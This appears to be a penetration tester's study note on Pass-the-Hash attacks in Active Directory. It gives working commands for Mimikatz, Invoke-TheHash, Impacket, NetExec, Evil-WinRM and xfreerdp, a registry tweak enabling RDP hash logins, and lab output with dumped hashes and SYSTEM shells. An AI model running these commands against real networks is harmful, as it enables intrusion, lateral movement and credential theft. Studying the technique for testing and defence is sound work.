---
created: 2026-07-31
updated: 2026-10-11
tags:
  - AD
  - AD_attacks
---
## Pass-the-Hash

- [[🛠️ NTLM]] is a **challenge-response protocol**: when the client wants to authenticate, the server issues a random challenge, and the client proves knowledge of the user's password by computing a response from that challenge and the user's NT hash. 
- The hash is used directly, never salted or passed through a [KDF](https://en.wikipedia.org/wiki/Key_derivation_function). Therefore, during authentication, the **NT hash is functionally equivalent to the password**.
- This means if you have the NT hash, you can authenticate as that user without knowing the plaintext password.

>[!note] See [[🛠️ NTLM]].

>**Pass-the-Hash (PtH)** is a credential-reuse attack in which an adversary authenticates to other systems using a captured NT hash instead of the plaintext password.

- There are several primary sources of NT hashes:

- **SAM database**
	- The SAM (Security Accounts Manager) database stores **NT hashes of local accounts** on every Windows system. 
	- To dump the SAM database, you need local `Administrator` or `SYSTEM` access. 
	- See [[Dumping Windows registry hives]].

- **LSASS memory**
	- When a user logs in interactively (or via services), Windows often caches their credentials in LSASS memory. 
	- Tools such as Mimikatz can extract those hashes — if you have local admin or `SYSTEM`.
	- See [[Dumping LSASS memory]].

- `NTDS.dit` on Domain Controllers
	- NTDS (NT Directory Services) contains all domain user credentials, including NT hashes.
	- Extracting it requires either physical access, VSS snapshot abuse, or replication rights ([DRSUAPI](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/58f33216-d9f1-43bf-a183-87e3c899c410) `DCSync`).
	- See [[🛠️ Dumping LSA secrets]].

- NTLM is accepted for authentication by many protocols, including:
	- **SMB** (TCP port `445`): by far the most common target; often provides authenticated shares (`C$`, `ADMIN$`) and RPC transport for service management.
	- **WinRM/WSMan** (TCP ports `5985`/`5986`): PowerShell remoting.
	- **LDAP/LDAPS** (TCP ports `389`/`636`/`3268`/`3269`): Active Directory queries.
	- **HTTP/HTTPS Negotiate**: NTLM authentication over HTTP(S); used in IIS applications, internal web portals, etc.
	- **RPC** (TCP port `135` + dynamic ports > `1024`): DCOM, WMI, Task Scheduler.
	- **RDP** (TCP `3389`): remote desktop access (with Restricted Admin Mode enabled; see below).
	- **MSSQL**: when configured with Windows authentication.

>[!important]+ Pass-the-Hash vs. NTLM relay
>- PtH uses a stored hash as authentication material.
>- NTLM relay forwards a live authentication exchange to another server in real time and doesn't require the hash itself. See [[◯ NTLM relay]].


- Tools you can use to perform the Pass-the-Hash attack:
	- [`mimikatz`](https://github.com/gentilkiwi/mimikatz) (C)
		- `sekurlsa::pth`
	- [`Impacket`](https://github.com/fortra/impacket/tree/master/impacket) scripts (Python), including:
		- [`psexec.py`](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
		- [`smbexec.py`](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)
		- [`wmiexec.py`](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)
		- [`atexec.py`](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
		- [`secretsdump.py`](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
	- [`NetExec`](https://github.com/Pennyw0rth/NetExec) (Python)
	- [`FreeRDP`](https://github.com/FreeRDP/FreeRDP) (C)
	- [`lsassy`](https://github.com/login-securite/lsassy) (Python)
	- [`pth-toolkit`](https://github.com/byt3bl33d3r/pth-toolkit) (Python)
	- And many more.

## Pass-the-Hash with Mimikatz (from Windows)

- If you’re already on a Windows host and have local `Administrator` or `SYSTEM` rights (more specifically, you need [[SeDebugPrivilege]]), you can use Mimikatz to extract hashes and use them. 
- The `sekurlsa::pth` module spawns a new process with a forged logon session using the provided hash; it can be used to perform [[Pass-the-Hash]] and [[Overpass-the-Hash]] attacks.

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<hash> /domain:<domain> /run:cmd.exe" exit
```

- This opens a `cmd.exe` window that runs in the context of the specified user. Any NTLM authentication that process initiates (e.g., UNC paths, `net use`, SMB connections) will be performed using the injected hash.
---

- `privilege::debug` requests the `SeDebugPrivilege` (debug privilege); it is required to inspect memory of processes owned by other accounts.
- `sekurlsa::logonpasswords`: lists all available provider credentials; it usually shows recently logged on user and computer credentials.

| Option            | Description                                                                                             |
| ----------------- | ------------------------------------------------------------------------------------------------------- |
| `/user`           | Username to impersonate.                                                                                |
| `/domain`         | FQDN of the target AD domain or NetBIOS name; use `.` for local accounts.                               |
| `/ntlm` or `/rc4` | NT hash (derived from the user's password).                                                             |
| `/run`            | Command line to run (default: `cmd.exe`).                                                               |
| `/luid`           | [`Locally unique identifier (LUID)`](https://devblogs.microsoft.com/oldnewthing/20240830-00/?p=110198). |

>[!note] There are other options like `/aes128` and `/aes256` that are used for Pass-the-Key and [[Overpass-the-Hash]] attacks against Kerberos. 

## Pass-the-Hash with `Invoke-TheHash` (Windows)

- [`Invoke-TheHash`](https://github.com/Kevin-Robertson/Invoke-TheHash) is a collection of PowerShell functions for performing Pass-the-Hash attacks. It can be run directly in a PowerShell session, without external tools.

>[!info] `Invoke-TheHash` implements NTLM authentication using .NET's `TCPClient`, not by loading actual Windows SMB/WMI clients. 

- The module provides the following functions:

| Function           | Description                                                                                                 |
| ------------------ | ----------------------------------------------------------------------------------------------------------- |
| `Invoke-WMIExec`   | Executes a command via **WMI**; RPC/WMI ports (TCP port `135` and dynamic ports >`1024`) must be reachable. |
| `Invoke-SMBExec`   | Executes a command via **SMB** (PsExec-style).                                                               |
| `Invoke-SMBEnum`   | Enumerates users, groups, shares, sessions over SMB.                                                        |
| `Invoke-SMBClient` | Lists, downloads, uploads, and deletes files over SMB; doesn't require execution rights.                            |
| `Invoke-TheHash`   | Wrapper that runs `WMIExec`, `SMBExec`, `SMBEnum`, or `SMBClient` against multiple targets.      |

- [`Invoke-WMIExec`](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1) (PtH via WMI)
	- Executes a command via **WMI**; doesn't require write access to shares, but uses RPC/WMI ports (TCP port `135` and dynamic ports >`1024` must be reachable).

```powershell
Import-Module .\Invoke-TheHash.psd1
```

```powershell
Invoke-WMIExec `
	-Target 10.0.0.11 `
	-Domain LAB `
	-Username Administrator `
	-Hash F6F38B793DB6A94BA04A52F1D3EE92F0 `
	-Command "whoami" -verbose
```

>[!note] If you omit `-Command`, the function will _only test whether it can authenticate to WMI_ and exit.

- [`Invoke-SMBExec`](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1) (PtH via SMB exec; PsExec-like)
	- Executes commands via **SMB** (PsExec-style); supports SMBv1 and SMBv2.1, with and without SMB signing.
	- Creates a temporary service to execute the command — similar to traditional PsExec semantics.

```powershell
Invoke-SMBExec `
	-Target 10.0.0.11 `
	-Domain LAB `
	-Username Administrator `
	-Hash F6F38B793DB6A94BA04A52F1D3EE92F0 `
	-Command "whoami" -verbose
```

- [`Invoke-SMBEnum`](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBEnum.ps1) (SMB enumeration)
	- Enumerates users, groups, shares, session lists over SMB using the provided NT hash.

```powershell
Invoke-SMBEnum `
	-Target 10.0.0.11 `
	-Domain LAB `
	-Username Administrator `
	-Hash F6F38B793DB6A94BA04A52F1D3EE92F0 `
	-verbose
```

>[!note] If you omit `-Command`, it will just check _whether the hash can authenticate and access SCM_ and exit.

- [`Invoke-SMBClient`](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBClient.ps1)
	- Implements SMB client operations (list, get, put, delete) using the provided NT hash; supports SMBv2.1 and SMB signing.
	- Particularly useful when you don't have remote execution rights but do have read/write access to specific shares.
	- Similar to `impacket-smbclient` but implemented in pure PowerShell.

- List the contents of a root share directory:

```powershell
Invoke-SMBClient `
	-Domain LAB `
	-Username Administrator `
	-Hash F6F38B793DB6A94BA04A52F1D3EE92F0 `
	-Source \\10.0.0.11\C$ `
	-Verbose
```

- Download a file:

```powershell
Invoke-SMBClient `
	-Domain LAB `
	-Username Administrator `
	-Hash F6F38B793DB6A94BA04A52F1D3EE92F0 `
	-Action Get `
	-Source \\10.0.0.11\C$\Users\public\file.txt `
	-Destination file.txt
```

- Upload a file:

```powershell
Invoke-SMBClient `
  -Domain LAB `
  -Username Administrator `
  -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 `
  -Action Put `
  -Source .\payload.exe `
  -Destination \\10.10.10.20\C$\Users\public\payload.exe
```

- [`Invoke-TheHash`](https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-TheHash.ps1)
	- A wrapper that lets you run `WMIExec`, `SMBExec`, `SMBEnum`, or `SMBClient` against a CIDR range or target list, with optional exclusion list.

```powershell
Invoke-TheHash `
  -Type WMIExec `
  -Target 10.10.10.0/24 `
  -TargetExclude 10.10.10.50 `
  -Username Administrator `
  -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
```

## Pass-the-Hash with `Impacket` (from Linux)

- [`Impacket`](https://github.com/fortra/impacket/tree/master/impacket) is a Python library and toolkit that implements Microsoft network protocols such as SMB, MSRPC, DCOM, WMI, and others from scratch. 
- You can use it to connect to Windows services directly from Linux, and authenticate via NTLM — whether using a password or an **NT hash during a Pass-the-Hash attack**.
---
- Impacket scripts commonly used for Pass-the-Hash attacks:

| Script                                                                                     | Execution                             | Writes binary?                     | Mechanism                              | Primary port                          |
| ------------------------------------------------------------------------------------------ | ------------------------------------- | ---------------------------------- | -------------------------------------- | ------------------------------------- |
| [`psexec.py`](https://github.com/fortra/impacket/blob/master/examples/psexec.py)           | Interactive shell                     | Yes (service executable)           | SMB + RPC to Service Control Manager   | TCP port `445`                        |
| [`smbexec.py`](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)         | Semi-interactive exec loop            | No (batch redirects; `.bat` files) | SMB + RPC service creation (in memory) | TCP port `445`                        |
| [`wmiexec.py`](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)         | One-shot or batched commands          | Temporary file on `ADMIN$`         | WMI over DCOM/RPC                      | TCP port `135` + dynamic port >`1024` |
| [`atexec.py`](https://github.com/fortra/impacket/blob/master/examples/atexec.py)           | One-shot execution via Task Scheduler | Temporary file on `ADMIN$`         | RPC -> Task Scheduler                  | TCP port `135` + dynamic port >`1024` |
| [`dcomexec.py`](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)       | Semi-interactive exec                 | No                                 | DCOM (`MMC20`/`ShellWindows`)          | TCP port `135` + dynamic port >`1024` |
| [`secretsdump.py`](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) | Credential dumping                    | N/A                                | Registry/DRSUAPI                       | TCP port `445`/`135`                  |

>[!note] Not all scripts give you an interactive shell; some run a single command and fetch output. 

- Impacket scripts accept NT and LM hashes via the `-hashes` option in the following format:

```bash
-hashes LMHASH:NTHASH
```

- If you only have the NT hash (common), prepend a colon:

```bash
-hashes :NTHASH
```

>[!note] Impacket can also perform NTLM relay attacks. See [[◯ NTLM relay]].

### `psexec.py`

- Impacket's [`psexec.py`](https://github.com/fortra/impacket/blob/master/examples/psexec.py) works similarly to **Microsoft PsExec**: it authenticates via SMB and creates a remote service (via RPC) that communicates back over named pipes.
- The script uploads a small service binary to `ADMIN$` and registers/starts it via Service Control Manager (SCM) RPC.

>[!note] [`PsExec`](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) is a command-line utility from the Sysinternals suite, designed to execute processes on remote systems. You can run commands, scripts, or applications interactively.

```bash
impacket-psexec -hashes <LM_hash>:<NT_hash> <domain>/<username>@<target> cmd.exe
```

>[!example]-
> ```bash
> impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.20 cmd.exe
> ```

>[!note]+ How `psexec.py` works
> 1. `psexec.py` authenticates to the target system over NTLM using the supplied hash (PtH).
> 2. It then uploads a randomly-named service binary to the target's `ADMIN$` share.
> 3. RPC is used to create and register a service from that executable via Service Control Manager (SCM).
> 4. Windows launches the service, which opens a named pipe back to you.
> 5. You get an interactive shell (`cmd.exe`) running on the target (`svcctl & srvsvc` RPC over SMB).

- To use `psexec.py`, several conditions must be met:
	- SMB port open (TCP port `445`).
	- Write permission to the `ADMIN$` share.
	- Account with remote execution privileges (usually local admin).

>[!warning] If any of those aren't true (e.g., no write access to `ADMIN$`), this will fail.

>[!example]-
> ```bash
> sudo nmap 10.129.204.23
> ```
> 
> ```bash
> Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-26 10:47 UTC
> Nmap scan report for 10.129.204.23
> Host is up (0.31s latency).
> Not shown: 993 closed tcp ports (reset)
> PORT     STATE SERVICE
> 80/tcp   open  http
> 135/tcp  open  msrpc
> 139/tcp  open  netbios-ssn
> 445/tcp  open  microsoft-ds
> 2222/tcp open  EtherNetIP-1
> 3389/tcp open  ms-wbt-server
> 5985/tcp open  wsman
> 
> Nmap done: 1 IP address (1 host up) scanned in 8.75 seconds
> ```
> 
> ```bash
> psexec.py -hashes :30B3783CE2ABF1AF70F77D0660CF3453 Administrator@10.129.204.23 cmd.exe
> ```
> 
> ```bash
> Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
> 
> [*] Requesting shares on 10.129.204.23.....
> [*] Found writable share ADMIN$
> [*] Uploading file IwEPvUPm.exe
> [*] Opening SVCManager on 10.129.204.23.....
> [*] Creating service PsCa on 10.129.204.23.....
> [*] Starting service PsCa.....
> [!] Press help for extra shell commands
> Microsoft Windows [Version 10.0.17763.2628]
> (c) 2018 Microsoft Corporation. All rights reserved.
> 
> C:\Windows\system32> whoami
> nt authority\system
> 
> C:\Windows\system32> 
> ```
### `smbexec.py`

- [`smbexec.py`](https://github.com/fortra/impacket/blob/master/examples/smbexec.py) is similar to `psexec.py`, but instead of a long-running binary service it creates temporary `.bat` files and executes them via the service controller in memory. Output is captured via SMB.
- You get an execution loop: you type commands, `smbexec.py` creates a `.bat` file for each, executes it, and returns the output. It resembles a shell, but it's technically a sequence of command executions.

```bash
impacket-smbexec -hashes <LM_hash>:<NT_hash> <domain>/<username>@<target> cmd.exe
```

>[!info] `smbexec.py` is more stealthy than `psexec.py`, since it doesn't upload any service executables to the target.

- To use `smbexec.py`, several conditions must be met (same as `psexec.py`):
	- SMB port open (TCP port `445`).
	- Write permission to the `ADMIN$` share.
	- Account with remote execution privileges (often local admin).

>[!example]-
> ```bash
> smbexec.py -hashes :30B3783CE2ABF1AF70F77D0660CF3453 target.local/Administrator@10.129.7.221
> ```
> 
> ```bash
> Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
> 
> [!] Launching semi-interactive shell - Careful what you execute
> C:\Windows\system32> whoami
> nt authority\system
> ```

### `wmiexec.py`

- [`wmiexec.py`](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) executes commands via **WMI/DCOM** and doesn't upload any binaries.
- The script first authenticates to an RPC endpoint on the target (TCP port `135`) using the provided hash, negotiates a dynamic random port with the target (>`1024`), and then invokes WMI remote execution (`cmd.exe`). The output is written to a file in the `ADMIN$` SMB share and retrieved automatically.
- You get a **single-shot execution** (e.g., `whoami`, `net user`, etc.). 

>[!info] `wmiexec.py` is often more stealthy since it doesn't create services.

```bash
impacket-wmiexec -hashes <LM_hash>:<NT_hash> <domain>/<username>@<target> "<command>"
```

>[!example]-
> ```bash
> impacket-wmiexec -hashes :NTHASH DOMAIN/Administrator@10.10.10.20 "whoami"
> ```


- To use `wmiexec.py`, several conditions must be met:
	- RPC ports reachable  (TCP port `135` + dynamic ports >`1024`)  
	- Credentials are valid for remote WMI calls.

>[!example]-
> ```bash
> wmiexec.py -hashes :30B3783CE2ABF1AF70F77D0660CF3453 Administrator@10.129.7.221 "whoami"
> ```
> 
> ```bash
> Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
> 
> [*] SMBv3.0 dialect used
> ms01\administrator
> ```
### `atexec.py`

- [`atexec.py`](https://github.com/fortra/impacket/blob/master/examples/atexec.py) connects to the target's **Task Scheduler Service** over RPC to create a one-off task that runs your command via `cmd.exe`. 
- The output is written to a temporary file in the `ADMIN$` SMB share and returned to you.
- `atexec.py` works well even if WMI is restricted but Task Scheduler RPC is available.

```bash
impacket-atexec -hashes <LM_hash>:<NT_hash> <domain>/<username>@<target> "<command>"
```

>[!note] This works only on Windows Vista and later.

>[!example]-
> ```bash
> atexec.py -hashes :30B3783CE2ABF1AF70F77D0660CF3453 Administrator@10.129.7.221 "whoami /priv"
> ```

### `dcomexec.py`

- [`dcomexec.py`](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py) is similar to `wmiexec.py`, but connects via other **DCOM endpoints** (`MMC20`, `ShellWindows`, etc.).
- Often useful when WMI is blocked or filtered, but DCOM endpoints are allowed.

```bash
dcomexec.py -hashes <LM_hash>:<NT_hash> <domain>/<username>@<target>
```

>[!example]-
> ```bash
> dcomexec.py -hashes :30B3783CE2ABF1AF70F77D0660CF3453 Administrator@10.129.7.221 
> ```
### `secretsdump.py`

- [`secretsdump.py`](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) extracts credentials from a remote SAM database, LSA secrets and (on DCs) `NTDS.dit` using DRSUAPI.
- The script doesn't directly give you a remote shell, but can be useful for PtH attacks.

```bash
impacket-secretsdump -hashes <LM_hash>:<NT_hash> <domain>/<username>@<target>
```

>[!info]+ The user must have enough privileges to fetch the credentials:
> • For local SAM/LSA: local admin or `SYSTEM`  
> • For domain NTDS: Domain Admin or DCSync rights

>[!example]-
> ```bash
> secretsdump.py -hashes :30B3783CE2ABF1AF70F77D0660CF3453 Administrator@10.129.7.221
> ```
> 
> ```bash
> Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
> 
> [*] Service RemoteRegistry is in stopped state
> [*] Starting service RemoteRegistry
> [*] Target system bootKey: 0x29fc3535fc09fb37d22dc9f3339f6875
> [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0660cf3453:::
> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
> [*] Dumping cached domain logon information (domain/username:hash)
> INLANEFREIGHT.HTB/julio:$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3: (2026-02-26 15:52:11+00:00)
> INLANEFREIGHT.HTB/david:$DCC2$10240#david#a8338587a1c6ee53624372572e39b93f: (2026-02-26 15:52:12+00:00)
> INLANEFREIGHT.HTB/john:$DCC2$10240#john#fbdeac2c1d121818f75796cedd0caf0a: (2026-02-26 15:52:11+00:00)
> [*] Dumping LSA Secrets
> [*] $MACHINE.ACC 
> INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:7976a24e6eb4cd458c3643a5182c823c7a9634441ea529a748511833324bb6d7
> INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:00ce0b94b2a1fe24fb1cd2409339a629
> INLANEFREIGHT\MS01$:des-cbc-md5:ea8301fd8043c1c2
> INLANEFREIGHT\MS01$:plain_password_hex:6a58787e0b55e4f58a3d6750f3be366187c2d889957c3d53485f7b2dca3890b28cd85380c8c8ec2526b289e0bedeaf2c7922d31b6313bdf3e3590748b4b4175e3266a9d3c3163ce9eb378de21e9d69982bbb4d2dbdfc458dbe83913c181dde14fe160bbe71451d2187471b36aebaab8bb77b4fabf66917c2f508368bccc1d2b2d421e5b7774646bfbbc43800391b5f03f94ce747ba2568ff420f1adb9fadf47ddf9689b7f268b41d52053cb1589fced533feb5cec542b8134a5b177cbcb4f12b3d37c26c99092a1db6e95ca7cc282d899cee35ebd2e90d4090d9906ee7bb28101765abc7169f1a1522bd59d287c4fe52
> INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:d419518a640bd423db4e951db9ef7821:::
> [*] DPAPI_SYSTEM 
> dpapi_machinekey:0x78f7020d08fa61b3b77b24130b1ecd58f53dd338
> dpapi_userkey:0x4c0d8465c338406d54a1ae09a56223e867907f39
> [*] NL$KM 
>  0000   A2 52 9D 31 0B B7 1C 75  45 D6 4B 76 41 2D D3 21   .R.1...uE.KvA-.!
>  0010   C6 5C DD 04 24 D3 07 FF  CA 5C F4 E5 A0 38 94 14   .\..$....\...8..
>  0020   91 64 FA C7 91 D2 0E 02  7A D6 52 53 B4 F4 A9 6F   .d......z.RS...o
>  0030   58 CA 76 00 DD 39 01 7D  C5 F7 8F 4B AB 1E DC 63   X.v..9.}...K...c
> NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
> [*] _SC_ALG 
> INLANEFREIGHT\julio:Password1
> [*] _SC_SNMPTRAP 
> INLANEFREIGHT\david:Password2
> [*] _SC_vds 
> INLANEFREIGHT\john:Password3
> [*] Cleaning up... 
> [*] Stopping service RemoteRegistry
> ```
## Pass the Hash with `NetExec` (Linux)

- [`NetExec`](https://github.com/Pennyw0rth/NetExec) (`nxc`) is a network exploitation and enumeration tool designed for Active Directory and Windows environments. It's a community-driven successor to CME (CrackMapExec). 

- Among other things, `NetExec` can authenticate to remote services using passwords, *NTLM hashes*, or Kerberos tickets. That's why it can be used to perform Pass-the-Hash attacks. 
- `NetExec` supports multiple protocols, including SMB, SSH, LDAP, FTP, WMI, WinRM, RDP, VNC, MSSQL, and NFS (see [`NetExec Wiki`](https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol)).


```bash
nxc <protocol> <target(s)> [options]
```

>[!example]-
> ```bash
> netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
> ```

>[!info] If you specify multiple targets, `NetExec` connects to them **in parallel**.

>[!note] See [`NetExec Wiki`](https://www.netexec.wiki/) to learn more about the tool.
## Pass the Hash with `Evil-WinRM` (Linux)

- [`Evil-WinRM`](https://github.com/Hackplayers/evil-winrm) is a tool for interacting with [WinRM (Windows Remote Management)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) from Linux — and it supports PtH attacks.

```bash
evil-winrm -i <target_ip> -u <username> -H <NTLM_hash>
```

>[!example]-
> ```bash
> evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
> ```

## Pass the Hash with RDP (Linux)

- PtH attacks can also be performed via RDP to gain GUI access to the target system. 
- You can use `xfreerdp` for this. Connect as usual but instead of a password (`/p:` option), specify an NT hash (`/pth:` option):

```bash
xfreerdp /v:<target> /u:<username> /pth:<NT_hash> /dynamic-resolution
```

>[!example]-
> ```bash
> xfreerdp /v:10.129.7.221 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /dynamic-resolution
> ```

>[!warning] By default, modern Windows (Windows 10/Server 2016+) has **[Restricted Admin Mode](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn408190(v=ws.11))** disabled for RDP logins, which _prevents_ PtH logins using hashes.
>- If Restricted Admin Mode is disabled (the default) and you try to connect via RDP using an NT hash, you'll see an error.
>- To allow PtH logins, Restricted Admin Mode must be enabled by setting the registry key `DisableRestrictedAdmin` to **`0`** under:
>```
>HKLM\System\CurrentControlSet\Control\Lsa
>```
>- If you have a way to run commands, you can enable Restricted Admin Mode with this command:
> ```powershell
> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
> ```
>- Alternatively, you can set this parameter in Registry Editor.

>[!example]-
> ```bash
> wmiexec.py -hashes :30B3783CE2ABF1AF70F77D0660CF3453 Administrator@10.129.7.221 "reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f"
> ```
> 
> ```bash
> xfreerdp /v:10.129.7.221 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /dynamic-resolution
> ```


## References and further reading 

- [`Pass the hash — Wikipedia`](https://en.wikipedia.org/wiki/Pass_the_hash)
- [`Use Alternate Authentication Material: Pass the Hash — MITRE`](https://attack.mitre.org/techniques/T1550/002/)

- [`pth — The Hacker Tools`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/pth)
- [`Pass the hash — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/ntlm/pth)

- [`Windows Remoting: Difference between psexec, wmiexec, atexec, *exec — ally-petitt.com`](https://ally-petitt.com/en/posts/2022-12-09_windows-remoting--difference-between-psexec--wmiexec--atexec---exec-bf7d1edb5986/)

- [`Impacket usage & detection — 0xf0x.com`](https://neil-fox.github.io/Impacket-usage-%26-detection/)
- [`The Impacket Arsenal: A Deep Dive into Impacket Remote Code Execution Tools — logpoint`](https://logpoint.com/en/blog/the-impacket-arsenal-a-deep-dive-into-impacket-remote-code-execution-tools)


- [`NetExec.wiki`](https://www.netexec.wiki/)
- [`NetExec, the Tool for Auditing an Internal Network — vaadata`](https://www.vaadata.com/blog/netexec-the-tool-for-auditing-an-internal-network/)

